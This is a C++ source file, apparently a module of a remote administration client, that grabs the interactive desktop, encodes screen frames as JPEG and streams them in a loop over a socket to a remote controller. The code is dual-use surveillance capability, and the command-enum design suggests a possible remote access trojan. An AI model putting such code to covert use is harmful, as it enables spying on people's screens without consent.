#include "cliente.hpp"
#include "mod_remote_desktop.hpp"
#include "misc.hpp"

extern Cliente* cCliente;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;  // Failure

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

bool mod_RemoteDesktop::m_isRunning() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteDesktop);
    return this->isRunning;
}

void mod_RemoteDesktop::m_UpdateVmouse(bool isVisible) {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    this->isMouseOn = isVisible;
}

bool mod_RemoteDesktop::m_Vmouse() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    return this->isMouseOn;
}

void mod_RemoteDesktop::InitGDI() {
    if (Gdiplus::GdiplusStartup(&this->gdiplusToken, &this->gdiplusStartupInput, NULL) == Gdiplus::Status::Ok) {
        this->isGDIon = true;
    }
}

void mod_RemoteDesktop::StopGDI() {
    Gdiplus::GdiplusShutdown(this->gdiplusToken);
}

ULONG mod_RemoteDesktop::m_Quality() {
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    return this->uQuality;
}

void mod_RemoteDesktop::m_UpdateQuality(int iNew) {
    //32 default
    std::unique_lock<std::mutex> lock(this->mtx_RemoteSettings);
    this->uQuality = iNew == 0 ? 32 : static_cast<ULONG>(iNew);
}

mod_RemoteDesktop::mod_RemoteDesktop() {
    this->InitGDI();
	return;
}

mod_RemoteDesktop::~mod_RemoteDesktop() {
    this->StopGDI();
    return;
}

std::vector<BYTE> mod_RemoteDesktop::getFrameBytes(ULONG quality) {
    std::vector<BYTE> cBuffer;

    if (!this->isGDIon) {
        DebugPrint("GDI no esta inicializado, init...");
        this->InitGDI();
        if (!this->isGDIon) {
            DebugPrint("[X] No se pudo iniciar...");
            return cBuffer;
        }
    }
    
    HWINSTA hWindowsStation = NULL;
    HDESK hInputDesktop = NULL;
    HDESK hOrigDesktop = NULL;
    HWND hDesktopWnd = NULL;
    HDC hdc = NULL;
    HDC hmemdc = NULL;
    HBITMAP hbmp = NULL;

    Gdiplus::Bitmap* pScreenShot = nullptr;
    IStream* oStream;
    HRESULT hr = S_OK;
    
    //Cursor
    CURSORINFO cursor = { sizeof(cursor) };
    ICONINFO info = { sizeof(info) };
    RECT cursorRect;
    int cursorX = 0;
    int cursorY = 0;
    BITMAP bmpCursor = { 0 };
    
    OSVERSIONINFO os;
    int xm = SM_CXVIRTUALSCREEN;
    int ym = SM_CYVIRTUALSCREEN;
    int xp = SM_XVIRTUALSCREEN;
    int yp = SM_YVIRTUALSCREEN;
    int sx = 0;
    int sy = 0;
    int sxpos = 0;
    int sypos = 0;

    HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);

    if (hGlobalMem == NULL) {
        goto EndSec;
    }

    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (!GetVersionEx(&os)) {
        DebugPrint("GetVersionEx failed\n");
        goto EndSec;
    }
    if (os.dwMajorVersion <= 4) {
        xm = SM_CXSCREEN;
        ym = SM_CYSCREEN;
    }

    hWindowsStation = OpenWindowStationA("WinSta0", FALSE, WINSTA_ALL_ACCESS);
    if (!hWindowsStation) {
        if (RevertToSelf()) {
            hWindowsStation = OpenWindowStationA("WinSta0", FALSE, WINSTA_ALL_ACCESS);
        }
    }
    if (!hWindowsStation) {
        DebugPrint("Couldnt get the Winsta0 Window Station\n");
        goto EndSec;
    }
    
    if (!SetProcessWindowStation(hWindowsStation)) {
        DebugPrint("Unable to set process windows station\n");
        goto EndSec;
    }
    hInputDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
    if (!hInputDesktop) {
        DebugPrint("OpenInputDesktop failed\n");
        goto EndSec;
    }
    hOrigDesktop = GetThreadDesktop(GetCurrentThreadId());
    SetThreadDesktop(hInputDesktop);
    hDesktopWnd = GetDesktopWindow();
    hdc = GetDC(hDesktopWnd);
    if (!hdc) {
        DebugPrint("GetDC failed\n");
        goto EndSec;
    }
    hmemdc = CreateCompatibleDC(hdc);
    if (!hmemdc) {
        DebugPrint("GetcomtabielDC failed\n");
        goto EndSec;
    }
    sx = GetSystemMetrics(xm);
    sy = GetSystemMetrics(ym);

    if (os.dwMajorVersion >= 4) {
        sxpos = GetSystemMetrics(xp);
        sypos = GetSystemMetrics(yp);
    }

    hbmp = CreateCompatibleBitmap(hdc, sx, sy);
    if (!hbmp) {
        DebugPrint("Createcompatiblebitmap failed\n");
        goto EndSec;
    }
    if (!SelectObject(hmemdc, hbmp)) {
        DebugPrint("select object failed\n");
        goto EndSec;
    }
    if (!BitBlt(hmemdc, 0, 0, sx, sy, hdc, sxpos, sypos, SRCCOPY)) {
        DebugPrint("bitblt failed\n");
        goto EndSec;
    }

    //Si esta habilitado mostrar el mouse
    if (this->m_Vmouse()) {
        GetCursorInfo(&cursor);
        if (cursor.flags == CURSOR_SHOWING) {
            GetWindowRect(hDesktopWnd, &cursorRect);
            GetIconInfo(cursor.hCursor, &info);
            cursorX = cursor.ptScreenPos.x - cursorRect.left - cursorRect.left - info.xHotspot;
            cursorY = cursor.ptScreenPos.y - cursorRect.top - cursorRect.top - info.yHotspot;
            GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
            DrawIconEx(hmemdc, cursorX, cursorY, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight, 0, NULL, DI_NORMAL);
        }
    }

    hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
    if (hr != S_OK) {
        DebugPrint("CreateStreamOnHGlobal\n");
        goto EndSec;
    }

    STATSTG statstg;
    CLSID imageCLSID;
    
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &quality;

    GetEncoderClsid(L"image/jpeg", &imageCLSID);
    
    pScreenShot = new Gdiplus::Bitmap(hbmp, (HPALETTE)NULL);

    if (!pScreenShot) {
        DebugPrint("No se pudo reservar memoria para crear el bitmap");
        goto EndSec;
    }

    if (pScreenShot->Save(oStream, &imageCLSID, &encoderParams) != Gdiplus::Status::Ok) {
        DebugPrint("No se pudo guardar el buffer al stream");
        goto EndSec;
    }

    hr = oStream->Stat(&statstg, STATFLAG_NONAME);
    if (hr == S_OK) {
        ULONG bytes_read = 0;
        unsigned long long int uiBuffsize = statstg.cbSize.LowPart;
        cBuffer.resize(uiBuffsize);
        if (cBuffer.size() == uiBuffsize) {
            oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
            hr = oStream->Read(cBuffer.data(), uiBuffsize, &bytes_read);
        }
    }

EndSec:

    if (pScreenShot) {
        delete pScreenShot;
        pScreenShot = nullptr;
    }

    

    if (hdc) {
        ReleaseDC(hDesktopWnd, hdc);
    }
    if (hmemdc) {
        DeleteDC(hmemdc);
    }
    if (hbmp) {
        DeleteObject(hbmp);
    }
    if (hOrigDesktop) {
        SetThreadDesktop(hOrigDesktop);
    }
    if (hWindowsStation) {
        CloseWindowStation(hWindowsStation);
    }
    if (hInputDesktop) {
        CloseDesktop(hInputDesktop);
    }

    return cBuffer;

}

void mod_RemoteDesktop::SpawnThread(int quality) {
    this->th_RemoteDesktop = std::thread(&mod_RemoteDesktop::IniciarLive, this, quality);
}

void mod_RemoteDesktop::DetenerLive() {
    DebugPrint("[RD] Apagando...");
    std::unique_lock<std::mutex> lock(this->mtx_RemoteDesktop);
    this->isRunning = false;
    lock.unlock();
    DebugPrint("[RD] Joining thread...");
    if (this->th_RemoteDesktop.joinable()) {
        this->th_RemoteDesktop.join();
    }
    DebugPrint("[RD] Done omar :v");
}

void mod_RemoteDesktop::IniciarLive(int quality) {
    this->isRunning = true;
    this->m_UpdateQuality(quality);
    //Head del paquete para no tener que crear uno nuevo en el loop
    std::string strCommand = std::to_string(EnumComandos::RD_Salida);
    strCommand.append(1, CMD_DEL);
    int iHeadSize = strCommand.size();

    while (this->m_isRunning()) {
        
        std::vector<BYTE> scrBuffer = this->getFrameBytes(this->m_Quality());
        if (scrBuffer.size() > 0) {
            int iBufferSize = scrBuffer.size();
            int iPaquetSize = iBufferSize + iHeadSize;
            std::vector<BYTE> cPaquete(iPaquetSize);
            
            std::memcpy(cPaquete.data(), strCommand.c_str(), iHeadSize);
            std::memcpy(cPaquete.data() + iHeadSize, scrBuffer.data(), iBufferSize);

            int iSent = cCliente->cSend(cCliente->sckSocket, reinterpret_cast<const char*>(cPaquete.data()), iPaquetSize, 0, true, nullptr);
            if (iSent == -1) {
                break;
            }
        }else {
            DebugPrint("Hubo un error creando el buffer. Esperando...");
            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
        }
    }
}